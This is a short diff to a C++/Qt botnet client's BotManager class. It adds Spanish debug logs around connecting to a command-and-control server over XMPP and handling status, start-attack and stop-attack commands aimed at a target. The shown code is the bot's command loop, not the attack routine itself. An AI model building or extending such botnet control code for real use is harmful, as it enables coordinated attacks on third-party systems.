@@ -37,11 +37,15 @@ void BotManager::connectToCC()
 void BotManager::disconnectFromCC()
 {
     _xmppClient -> disconnectFromServer();
+
+    qDebug() << "Desconectado de C&C";
 }
 
 void BotManager::readyOnXmppClient()
 {
     _bot -> setState(WaitingForCommand);
+
+    qDebug() << "Conectado a C&C como" << _xmppClient -> whoAmI();
 }
 
 void BotManager::commandReceivedOnBot(Message *command)
@@ -49,20 +53,33 @@ void BotManager::commandReceivedOnBot(Message *command)
     Message *response = 0;
     bool isValid = true;
 
-    qDebug() << "Command received from" << command -> from();
-
     if(dynamic_cast<GetStatusCommand *>(command) ||
        dynamic_cast<GetBotStateCommand *>(command)) {
         response = new BotStateResponse;
         dynamic_cast<BotStateResponse *>(response) -> setBot(_bot);
+
+        qDebug() << "Recibido GET_BOT_STATE_CMD de" << command -> from();
+        qDebug() << "Enviado BOT_STATE_RES con id:" << _bot -> id()
+                 << "ip:" << _bot -> ip() << "os:" << _bot -> os()
+                 << "estado:" << _bot -> state()
+                 << "attackId:" << _bot -> attack().id()
+                 << "target:" << _bot -> attack().target();
     } else if(StartAttackCommand *startAttackCommand = dynamic_cast<StartAttackCommand *>(command)) {
         response = new AttackStartedResponse(command -> id());
         _bot -> setState(AttackInProgress);
         _bot -> setAttack(Attack(startAttackCommand -> id(), startAttackCommand -> target()));
+
+        qDebug() << "Recibido START_ATTACK_CMD de" << startAttackCommand -> from()
+                 << "con id:" << startAttackCommand -> id()
+                 << "target:" << startAttackCommand -> target();
+        qDebug() << "Enviado ATTACK_STARTED_RES";
     } else if(dynamic_cast<StopAttackCommand *>(command)) {
         response = new AttackStoppedResponse(command -> id());
         _bot -> setState(WaitingForCommand);
         _bot -> setAttack(Attack());
+
+        qDebug() << "Recibido STOP_ATTACK_CMD de" << command -> from();
+        qDebug() << "Enviado ATTACK_STOPPED_RES";
     } else
         isValid = false;
 
